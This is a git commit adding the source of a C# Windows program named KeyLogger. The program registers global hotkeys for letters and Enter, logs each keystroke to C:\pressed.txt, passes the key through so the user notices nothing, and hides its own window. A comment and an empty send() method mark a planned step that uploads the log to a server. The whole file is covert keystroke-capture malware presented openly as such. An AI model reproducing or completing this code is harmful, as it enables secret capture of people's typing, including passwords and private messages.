be9f3e400cc3ee4d44095987ea9769b296e6709d
nguyenhongphat0 <nguyenhongphat28121998@gmail.com>
2018-01-15 12:25:20 +0700

    first commit

---
+++ KeyLogger/MainForm.cs
@@ -0,0 +1,67 @@
+﻿using System;
+using System.Collections.Generic;
+using System.ComponentModel;
+using System.Data;
+using System.Drawing;
+using System.IO;
+using System.Linq;
+using System.Runtime.InteropServices;
+using System.Text;
+using System.Windows.Forms;
+
+namespace KeyLogger
+{
+    public partial class MainForm : Form
+    {
+        string logFile = "C:\\pressed.txt";
+        [DllImport("user32.dll")]
+        public static extern bool RegisterHotKey(IntPtr hWnd, int id, int fsModifiers, int vlc);
+        [DllImport("user32.dll")]
+        public static extern bool UnregisterHotKey(IntPtr hWnd, int id);
+
+        public MainForm()
+        {
+            InitializeComponent();
+            for (int i = 'A'; i <= 'Z'; i++)
+            {
+                RegisterHotKey(this.Handle, i + 32, 0, i);
+            }
+            for (int i = 'A'; i <= 'Z'; i++)
+            {
+                RegisterHotKey(this.Handle, i, 4, i);
+            }
+            RegisterHotKey(this.Handle, 13, 0, 13);
+        }
+
+        protected override void WndProc(ref Message m)
+        {
+            if (m.Msg == 0x0312)
+            {
+                // Handle the key (store it to somewhere)
+                store(m.WParam.ToInt32());
+            }
+            base.WndProc(ref m);
+        }
+
+        void store(int code)
+        {
+            char key = (char)code;
+            File.AppendAllText(logFile, key + "");
+            if (code == 13)
+            {
+                // Send the log (to server or something)
+                File.Delete(logFile);
+            }
+            SendKeys.Send(key + "");
+        }
+
+        void send()
+        {
+        }
+
+        private void MainForm_Shown(object sender, EventArgs e)
+        {
+            this.Hide();
+        }
+    }
+}
